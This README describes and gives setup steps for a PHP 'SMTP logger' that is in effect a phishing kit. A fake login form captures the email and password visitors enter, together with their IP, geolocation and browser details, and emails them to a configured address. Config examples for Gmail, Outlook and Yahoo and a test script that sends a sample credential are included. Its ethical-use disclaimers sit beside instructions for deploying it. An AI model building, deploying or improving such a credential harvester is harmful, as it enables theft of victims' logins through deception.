# PHP SMTP Logger System

A secure PHP-based logging system that captures login attempts and sends them via email using SMTP. This system is designed for ethical security monitoring and testing purposes.

## Features

- **Real-time logging**: Captures login attempts instantly
- **SMTP email delivery**: Sends detailed logs via email
- **Comprehensive data collection**: IP address, browser info, timestamps, etc.
- **Fallback logging**: File-based backup logging
- **PHPMailer support**: Robust email delivery
- **Security focused**: Built with ethical use in mind

## Installation

### 1. Clone or Download Files

Make sure you have all the following files in your web directory:
- `index.html` - The login form
- `postmailer.php` - Main handler script
- `smtp_logger.php` - SMTP logging class
- `config.php` - Configuration file
- `composer.json` - Dependencies

### 2. Install Dependencies (Recommended)

Install PHPMailer for better SMTP support:

```bash
composer install
```

If you don't have Composer, you can download PHPMailer manually or use the built-in PHP mail() function.

### 3. Configure SMTP Settings

Edit `config.php` and update the following settings:

```php
// SMTP Server Settings
define('SMTP_HOST', 'smtp.gmail.com');          // Your SMTP server
define('SMTP_PORT', 587);                       // SMTP port
define('SMTP_USERNAME', 'your-email@gmail.com'); // SMTP username
define('SMTP_PASSWORD', 'your-app-password');    // SMTP password

// Email Settings
define('LOG_EMAIL', 'logs@yourdomain.com');      // Where to send logs
define('FROM_EMAIL', 'noreply@yourdomain.com');  // From address
define('FROM_NAME', 'Security Logger');          // From name
```

### 4. Set Up Permissions

Create a logs directory and set appropriate permissions:

```bash
mkdir logs
chmod 755 logs
```

## SMTP Configuration Examples

### Gmail
```php
define('SMTP_HOST', 'smtp.gmail.com');
define('SMTP_PORT', 587);
define('SMTP_USERNAME', 'your-gmail@gmail.com');
define('SMTP_PASSWORD', 'your-app-password'); // Use App Password, not regular password
```

### Outlook/Hotmail
```php
define('SMTP_HOST', 'smtp-mail.outlook.com');
define('SMTP_PORT', 587);
define('SMTP_USERNAME', 'your-email@outlook.com');
define('SMTP_PASSWORD', 'your-password');
```

### Yahoo
```php
define('SMTP_HOST', 'smtp.mail.yahoo.com');
define('SMTP_PORT', 587);
define('SMTP_USERNAME', 'your-email@yahoo.com');
define('SMTP_PASSWORD', 'your-password');
```

## Security Considerations

### For Gmail Users
1. Enable 2-Factor Authentication
2. Generate an "App Password" instead of using your regular password
3. Use the App Password in the configuration

### General Security
- Use environment variables for sensitive data in production
- Implement rate limiting to prevent abuse
- Monitor log file sizes and implement rotation
- Use HTTPS in production environments
- Regularly update dependencies

## Usage

1. Upload all files to your web server
2. Configure SMTP settings in `config.php`
3. Access `index.html` in your browser
4. Any login attempts will be logged and emailed

## Log Format

Each logged attempt includes:
- Timestamp
- Email and password entered
- IP address and geolocation info
- Browser and user agent details
- Server information
- Session details

## Files Structure

```
/
├── index.html          # Login form
├── postmailer.php      # Main handler
├── smtp_logger.php     # Logging class
├── config.php          # Configuration
├── composer.json       # Dependencies
├── logs/              # Log files directory
└── vendor/            # PHPMailer (after composer install)
```

## Troubleshooting

### Common Issues

1. **Emails not sending**
   - Check SMTP credentials
   - Verify firewall/port settings
   - Check PHP error logs

2. **Permission errors**
   - Ensure logs directory has write permissions
   - Check file ownership

3. **PHPMailer not found**
   - Run `composer install`
   - Or download PHPMailer manually

### Testing SMTP Connection

Create a simple test script:

```php
<?php
require_once 'config.php';
require_once 'smtp_logger.php';

$logger = new SMTPLogger();
$testData = [
    'timestamp' => date('Y-m-d H:i:s'),
    'email' => 'test@example.com',
    'password' => 'test123',
    'ip_address' => '127.0.0.1',
    'user_agent' => 'Test Browser',
    'browser' => 'Test',
    'referer' => 'Direct',
    'session_id' => 'test_session',
    'server_name' => 'localhost',
    'request_uri' => '/test'
];

if ($logger->logAttempt($testData)) {
    echo "Test email sent successfully!";
} else {
    echo "Failed to send test email.";
}
?>
```

## Legal and Ethical Use

**IMPORTANT**: This system is designed for:
- Security testing of your own systems
- Educational purposes
- Legitimate security monitoring
- Authorized penetration testing

**DO NOT USE** for:
- Unauthorized access to systems
- Phishing attacks
- Malicious activities
- Any illegal purposes

Always ensure you have proper authorization before deploying this system.

## Contributing

This project is designed for educational and ethical security testing. If you find bugs or have improvements, please ensure they maintain the ethical focus of the project.

## License

This project is provided for educational and ethical use only. Users are responsible for ensuring compliance with all applicable laws and regulations.